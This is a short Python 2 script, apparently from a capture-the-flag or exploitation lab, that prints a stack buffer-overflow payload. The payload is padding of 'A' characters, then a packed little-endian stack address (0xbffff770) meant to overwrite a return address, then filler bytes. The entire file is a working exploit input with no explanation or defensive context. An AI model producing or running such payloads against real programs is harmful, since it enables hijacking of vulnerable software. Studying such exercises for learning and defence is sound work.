import struct

arg1 = "A" * 40
offset = "A" * 23
landing = struct.pack("<I", 0xbffff770)
filler = "A" * 5

print arg1 + " " + offset + landing + filler

